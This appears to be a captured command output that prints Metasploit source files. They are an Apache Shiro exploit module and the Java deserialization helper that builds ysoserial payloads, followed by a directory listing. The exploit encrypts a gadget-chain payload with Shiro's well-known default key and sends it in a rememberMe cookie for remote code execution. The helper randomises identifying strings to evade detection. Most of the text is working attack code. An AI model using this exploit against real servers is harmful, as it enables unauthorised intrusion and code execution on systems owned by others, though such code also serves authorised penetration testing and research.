@@ -1,0 +1,154 @@
+﻿=== module body (60-140) ===
+          'Reliability' => [ REPEATABLE_SESSION ]
+        }
+      )
+    )
+    register_options(
+      [
+        OptString.new('TARGETURI', [ true, 'Base directory path', '/']),
+        OptString.new('ENC_KEY', [ true, 'Shiro encryption key', 'kPH+bIxk5D2deZiIxcaaaA==']),
+        OptEnum.new('JAVA_GADGET_CHAIN', [
+          true, 'The Java gadget chain to use for deserialization', 'CommonsCollections2',
+          Msf::Exploit::JavaDeserialization.gadget_chains
+        ])
+      ]
+    )
+  end
+
+  def aes_encrypt(payload)
+    aes = OpenSSL::Cipher.new('aes-128-cbc')
+    aes.encrypt
+    aes.key = Rex::Text.decode_base64(datastore['ENC_KEY'])
+    aes.random_iv + aes.update(payload) + aes.final
+  end
+
+  def exploit
+    java_payload = generate_java_deserialization_for_payload(datastore['JAVA_GADGET_CHAIN'], payload)
+    ciphertext = aes_encrypt(java_payload)
+    base64_ciphertext = Rex::Text.encode_base64(ciphertext)
+
+    send_request_cgi({
+      'uri' => target_uri.path,
+      'method' => 'GET',
+      'cookie' => "rememberMe=#{base64_ciphertext}"
+    })
+  end
+
+end
+=== java_deserialization.rb ===
+# -*- coding: binary -*-
+
+module Msf
+module Util
+
+require 'json'
+
+class JavaDeserialization
+
+  PAYLOAD_FILENAME = "ysoserial_payloads.json"
+
+  def self.ysoserial_payload(payload_name, command=nil, modified_type: 'none')
+    payloads_json = load_ysoserial_data(modified_type)
+
+    # Extract the specified payload (status, lengthOffset, bufferOffset, bytes)
+    payload = payloads_json[payload_name]
+
+    raise ArgumentError, "#{payload_name} payload not found in ysoserial payloads" if payload.nil?
+
+    # Based on the status, we'll raise an exception, return a static payload, or
+    # generate a dynamic payload with modifications at the specified offsets
+    case payload['status']
+    when 'unsupported'
+      # This exception will occur most commonly with complex payloads that require more than a string
+      raise ArgumentError, 'ysoserial payload is unsupported'
+    when 'static'
+      # TODO: Consider removing 'static' functionality, since ysoserial doesn't currently use it
+      return Rex::Text.decode_base64(payload['bytes'])
+    when 'dynamic'
+      raise ArgumentError, 'missing command parameter' if command.nil?
+
+      bytes = Rex::Text.decode_base64(payload['bytes'])
+
+      # Insert buffer
+      buffer_offset  = payload['bufferOffset'].first   #TODO: Do we ever need to support multiple buffers?
+      bytes[buffer_offset - 1] += command
+
+      # Overwrite length (multiple times, if necessary)
+      length_offsets = payload['lengthOffset']
+      length_offsets.each do |length_offset|
+        # Extract length as a 16-bit unsigned int, then add the length of the command string
+        length  = bytes[(length_offset-1)..length_offset].unpack('n').first
+        length += command.length.ord
+        length  = [length].pack("n")
+        bytes[(length_offset-1)..length_offset] = length
+      end
+
+      # Replace "ysoserial\/Pwner" timestamp and "ysoserial" string with randomness for evasion
+      bytes.gsub!('ysoserial/Pwner00000000000000', Rex::Text.rand_text_alphanumeric(29))
+      bytes.gsub!('ysoserial', Rex::Text.rand_text_alphanumeric(9))
+
+      return bytes
+    else
+      raise RuntimeError, 'Malformed JSON file'
+    end
+  end
+
+  def self.ysoserial_payload_names(modified_type: 'none')
+    payloads_json = load_ysoserial_data(modified_type)
+    payloads_json.keys
+  end
+
+  class << self
+    private
+
+    def load_ysoserial_data(modified_type)
+      # Open the JSON file and parse it
+      path = File.join(Msf::Config.data_directory, PAYLOAD_FILENAME)
+      begin
+        json = JSON.parse(File.read(path, mode: 'rb'))
+      rescue Errno::ENOENT, JSON::ParserError
+        raise RuntimeError, "Unable to load JSON data from: #{path}"
+      end
+
+      # Extract the specified payload type (including cmd, bash, powershell, none)
+      payloads_json = json[modified_type.to_s]
+      if payloads_json.nil?
+        raise ArgumentError, "#{modified_type} type not found in ysoserial payloads"
+      end
+
+      payloads_json
+    end
+  end
+
+end # JavaDeserialization
+end # Util
+end # Msf
+=== java_deserialization dir ===
+total 116
+drwxr-xr-x 7 root root  4096 Jun 16 10:26 .
+drwxr-xr-x 6 root root  4096 Jun 16 10:26 ..
+-rw-r--r-- 1 root root  2498 May 26 08:02 db_manager.rb
+drwxr-xr-x 2 root root  4096 Jun 16 10:26 document_generator
+-rw-r--r-- 1 root root  2327 May 26 08:02 document_generator.rb
+drwxr-xr-x 5 root root  4096 Jun 16 10:26 dot_net_deserialization
+-rw-r--r-- 1 root root  4509 May 26 08:02 dot_net_deserialization.rb
+drwxr-xr-x 7 root root  4096 Jun 16 10:26 exe
+-rw-r--r-- 1 root root 13763 May 26 08:02 exe.rb
+-rw-r--r-- 1 root root   496 May 26 08:02 helper.rb
+-rw-r--r-- 1 root root  1814 May 26 08:02 host.rb
+drwxr-xr-x 2 root root  4096 Jun 16 10:26 java_deserialization
+-rw-r--r-- 1 root root  3018 May 26 08:02 java_deserialization.rb
+-rw-r--r-- 1 root root 10325 May 26 08:02 payload_cached_size.rb
+-rw-r--r-- 1 root root  1425 May 26 08:02 python_deserialization.rb
+-rw-r--r-- 1 root root  1319 May 26 08:02 ruby_deserialization.rb
+-rw-r--r-- 1 root root  1734 May 26 08:02 service_helper.rb
+-rw-r--r-- 1 root root 14478 May 26 08:02 windows_crypto_helpers.rb
+drwxr-xr-x 2 root root  4096 Jun 16 10:26 windows_registry
+/usr/share/metasploit-framework/lib/msf/core/exploit/java_deserialization.rb
+/usr/share/metasploit-framework/lib/msf/util/java_deserialization.rb
+/usr/share/metasploit-framework/lib/msf/util/java_deserialization
+/usr/share/metasploit-framework/lib/msf/util/java_deserialization/bean_factory.rb
+/usr/share/metasploit-framework/modules/exploits/windows/ibm/ibm_was_dmgr_java_deserialization_rce.rb
+=== DONE ===
+{"rc": 0, "stdout_len": 5721, "stderr_len": 0}
+
